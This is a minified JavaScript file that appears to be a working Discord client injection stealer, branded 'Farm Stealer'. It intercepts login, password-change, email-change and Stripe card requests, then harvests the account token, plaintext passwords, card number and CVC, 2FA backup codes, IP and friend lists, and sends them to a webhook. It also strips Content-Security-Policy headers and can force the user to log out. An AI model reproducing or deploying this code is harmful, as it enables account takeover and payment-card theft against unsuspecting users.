const{BrowserWindow:BrowserWindow,session:session}=require("electron"),fs=require("fs"),path=require("path"),querystring=require("querystring"),os=require("os"),webhook="%WEBHOOK_LINK%",Filters={1:{urls:["https://discord.com/api/v*/users/@me","https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.stripe.com/v1/tokens"]},2:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","https://*.discord.com/api/v*/users/@me/billing/subscriptions","https://discord.com/api/v*/users/@me/billing/subscriptions","wss://remote-auth-gateway.discord.gg/*"]}},config={logout:"%LOGOUT%","logout-notify":"%LOGOUTNOTI%","init-notify":"%INITNOTI%","embed-color":3447704,"disable-qr-code":"%DISABLEQRCODE%",ping:[!0,"@everyone"]},badges={Discord_Employee:{Value:1,Emoji:"<:staff:874750808728666152>",Rare:!0},Partnered_Server_Owner:{Value:2,Emoji:"<:partner:874750808678354964>",Rare:!0},HypeSquad_Events:{Value:4,Emoji:"<:hypesquad_events:874750808594477056>",Rare:!0},Bug_Hunter_Level_1:{Value:8,Emoji:"<:bughunter_1:874750808426692658>",Rare:!0},Early_Supporter:{Value:512,Emoji:"<:early_supporter:874750808414113823>",Rare:!0},Bug_Hunter_Level_2:{Value:16384,Emoji:"<:bughunter_2:874750808430874664>",Rare:!0},Early_Verified_Bot_Developer:{Value:131072,Emoji:"<:developer:874750808472825986>",Rare:!0},House_Bravery:{Value:64,Emoji:"<:bravery:874750808388952075>",Rare:!1},House_Brilliance:{Value:128,Emoji:"<:brilliance:874750808338608199>",Rare:!1},House_Balance:{Value:256,Emoji:"<:balance:874750808267292683>",Rare:!1}};class PirateStealerEvent{constructor(e,t,n){this.event=e,this.data=n,this.token=t}handle(){switch(this.event){case"passwordChanged":passwordChanged(this.data.password,this.data.new_password,this.token);break;case"userLogin":userLogin(this.data.password,this.data.email,this.token);break;case"emailChanged":emailChanged(this.data.password,this.data.email,this.token);break;case"creditCardAdded":creditCardAdded(this.data.cardnumber,this.data.cvc,this.data.expiration,this.token)}}}async function firstTime(){var e=await getToken();if("true"==config["init-notify"]&&fs.existsSync(path.join(__dirname,"init")))if(fs.rmdirSync(path.join(__dirname,"init")),null==e||null==e||""==e){var t={username:"Farm Stealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Discord Initalized (User not Logged in)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"}}]};sendToWebhook(JSON.stringify(t))}else{var n=await getUserInfo(e);t={username:"Farm Stealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Discord Initalized",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${e})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${n.username}#${n.discriminator}\``,inline:!0},{name:"ID",value:`\`${n.id}\``,inline:!0},{name:"Badges",value:`${getBadges(n.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${e}\`\`\``,inline:!1}],author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`}}]};sendToWebhook(JSON.stringify(t))}if(!fs.existsSync(path.join(__dirname,"PirateStealerBTW")))return!0;if(fs.rmdirSync(path.join(__dirname,"PirateStealerBTW")),"false"!=config.logout||"%LOGOUT%"==config.logout){if("true"==config["logout-notify"])if(null==e||null==e||""==e){t={username:"Farm Stealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User log out (User not Logged in before)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"}}]};sendToWebhook(JSON.stringify(t))}else{const n=await getUserInfo(e);t={username:"Farm Stealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User got logged out",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${e})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${n.username}#${n.discriminator}\``,inline:!0},{name:"ID",value:`\`${n.id}\``,inline:!0},{name:"Badges",value:`${getBadges(n.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${e}\`\`\``,inline:!1}],author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`}}]};sendToWebhook(JSON.stringify(t))}BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',!0).then((e=>{}))}return!1}async function userLogin(e,t,n){var a=await getUserInfo(n),i=await getIp(),r=await getBilling(n),o=await getRelationships(n),s={username:"Farm Stealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User Login",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${n}\n${e})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${i}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"ID",value:`\`${a.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"Billing",value:`${r}`,inline:!1},{name:"Email",value:`\`${t}\``,inline:!0},{name:"Password",value:`\`${e}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1}],author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Friends (${o.length})`,color:config["embed-color"],description:o.frien,author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]};if(n.startsWith("mfa")){var l=await get2faCodes(n,e),d={title:":detective: __2FA Codes__",description:`[Get all of them](${l.url})`,color:config["embed-color"],fields:l.fields,author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"}};s.embeds.push(d)}sendToWebhook(JSON.stringify(s))}async function emailChanged(e,t,n){var a=await getUserInfo(n),i=await getIp(),r=await getRelationships(n),o={username:"Farm Stealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Email Changed",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${n}\n${e}\n${t})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${i}\`\`\``,inline:!1},{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"ID",value:`\`${a.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"New Email",value:`\`${t}\``,inline:!0},{name:"Password",value:`\`${e}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1}],author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Friends (${r.length})`,color:config["embed-color"],description:r.frien,author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]};if(n.startsWith("mfa")){var s=await get2faCodes(n,e),l={title:":detective: __2FA Codes__",description:`[Get all of them](${s.url})`,color:config["embed-color"],fields:s.fields,author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"}};o.embeds.push(l)}sendToWebhook(JSON.stringify(o))}async function passwordChanged(e,t,n){var a=await getUserInfo(n),i=await getIp(),r=await getBilling(n),o=await getRelationships(n),s={username:"Farm Stealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Password Changed",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${n}\n${t})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${i}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"ID",value:`\`${a.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"Billing",value:`${r}`,inline:!1},{name:"Email",value:`\`${a.email}\``,inline:!1},{name:"Old Password",value:`\`${e}\``,inline:!0},{name:"New Password",value:`\`${t}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1}],author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}},{title:`Total Friends (${o.length})`,color:config["embed-color"],description:o.frien,author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]};if(n.startsWith("mfa")){var l=await get2faCodes(n,t),d={title:":detective: __2FA Codes__",description:`[Get all of them](${l.url})`,color:config["embed-color"],fields:l.fields,author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"}};s.embeds.push(d)}sendToWebhook(JSON.stringify(s))}async function creditCardAdded(e,t,n,a){var i=await getUserInfo(a),r=await getIp(),o=await getBilling(a),s=await getRelationships(a),l={username:"Farm Stealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Credit Card",description:`[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${a})`,color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nIP: \n${r}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${i.username}#${i.discriminator}\``,inline:!0},{name:"ID",value:`\`${i.id}\``,inline:!0},{name:"Nitro",value:`${getNitro(i.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(i.flags)}`,inline:!1},{name:"Billing",value:`${o}`,inline:!1},{name:"Email",value:`\`${i.email}\``,inline:!1},{name:"CC Number",value:`\`${e}\``,inline:!0},{name:"Expiration",value:`\`${n}\``,inline:!0},{name:"CVC",value:`\`${t}\``,inline:!0},{name:"Token",value:`\`\`\`${a}\`\`\``,inline:!1}],author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`}},{title:`Total Friends (${s.length})`,color:config["embed-color"],description:s.frien,author:{name:"Farm Stealer"},footer:{text:"Farm Stealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`}}]};sendToWebhook(JSON.stringify(l))}async function sendToWebhook(e){BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`var xhr = new XMLHttpRequest();xhr.open("POST", "${webhook}", true);xhr.setRequestHeader('Content-Type', 'application/json');xhr.setRequestHeader('Access-Control-Allow-Origin', '*');xhr.send(JSON.stringify(${e}));`,!0)}async function getRelationships(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );xmlHttp.setRequestHeader("Authorization", "${e}");xmlHttp.send( null );xmlHttp.responseText`,!0);const a=JSON.parse(n).filter((e=>1==e.type));var i="";for(z of a){var r=getRareBadges(z.user.public_flags);""!=r&&(i+=`${r} ${z.user.username}#${z.user.discriminator}\n`)}return i=i??"No Rare Friends",{length:a.length,frien:i}}async function get2faCodes(e,t){let n=[],a="https://ctf.surf/raw/";const i=BrowserWindow.getAllWindows()[0];var r=await i.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${e}");xmlHttp.send(JSON.stringify({"password":"${t}","regenerate":false}));xmlHttp.responseText`,!0);const o=JSON.parse(r).backup_codes.filter((e=>null==e.consumed));for(let e in o)n.push({name:"Code",value:`\`${o[e].code.insert(4,"-")}\``,inline:!0}),a+=`${o[e].code.insert(4,"-")}\n`;return{fields:n,url:a}}async function getBilling(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${e}"); xmlHttp.send( null ); xmlHttp.responseText`,!0),a=JSON.parse(n),i="";return a.forEach((e=>{if(2==e.type&&1!=e.invalid)i+="`✔️` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`❌`";i+="`✔️` :credit_card:"}})),i=i??"`❌`"}async function getUserInfo(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${e}");xmlHttp.send( null );xmlHttp.responseText;`,!0);return JSON.parse(n)}async function getIp(){const e=BrowserWindow.getAllWindows()[0];return await e.webContents.executeJavaScript('var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;',!0)}async function getToken(){const e=BrowserWindow.getAllWindows()[0];return await e.webContents.executeJavaScript("for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;",!0)}function getBadges(e){var t="";for(const n in badges){let a=badges[n];(e&a.Value)==a.Value&&(t+=a.Emoji)}return""==t&&(t="None"),t}function getRareBadges(e){var t="";for(const n in badges){let a=badges[n];(e&a.Value)==a.Value&&a.Rare&&(t+=a.Emoji)}return t}function getNitro(e){switch(e){case 1:return"<:classic:896119171019067423> `Nitro Classic`";case 2:return"<a:boost:824036778570416129> `Nitro Boost`";default:return"No Nitro"}}session.defaultSession.webRequest.onBeforeRequest(Filters[2],((e,t)=>{!e.url.startsWith("wss://")||"true"!=config["disable-qr-code"]&&"%DISABLEQRCODE%"!=config["disable-qr-code"]?(firstTime(),t({})):t({cancel:!0})})),session.defaultSession.webRequest.onHeadersReceived(((e,t)=>{e.url.startsWith(webhook)?e.url.includes("discord.com")?t({responseHeaders:Object.assign({"Access-Control-Allow-Headers":"*"},e.responseHeaders)}):t({responseHeaders:Object.assign({"Content-Security-Policy":["default-src '*'","Access-Control-Allow-Headers '*'","Access-Control-Allow-Origin '*'"],"Access-Control-Allow-Headers":"*","Access-Control-Allow-Origin":"*"},e.responseHeaders)}):(delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],t({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}}))})),session.defaultSession.webRequest.onCompleted(Filters[1],(async(e,t)=>{if(200!=e.statusCode)return;const n=Buffer.from(e.uploadData[0].bytes).toString(),a=JSON.parse(n),i=await getToken();switch(!0){case e.url.endsWith("login"):return void new PirateStealerEvent("userLogin",i,{password:a.password,email:a.login}).handle();case e.url.endsWith("users/@me")&&"PATCH"==e.method:if(!a.password)return;if(a.email)new PirateStealerEvent("emailChanged",i,{password:a.password,email:a.email}).handle();if(a.new_password)new PirateStealerEvent("passwordChanged",i,{password:a.password,new_password:a.new_password}).handle();return;case e.url.endsWith("tokens")&&"POST"==e.method:const t=querystring.parse(decodeURIComponent(n));return void new PirateStealerEvent("creditCardAdded",i,{cardnumber:t["card[number]"],cvc:t["card[cvc]"],expiration:`${t["card[exp_month]"]}/${t["card[exp_year]"]}`}).handle()}})),module.exports=require("./core.asar");
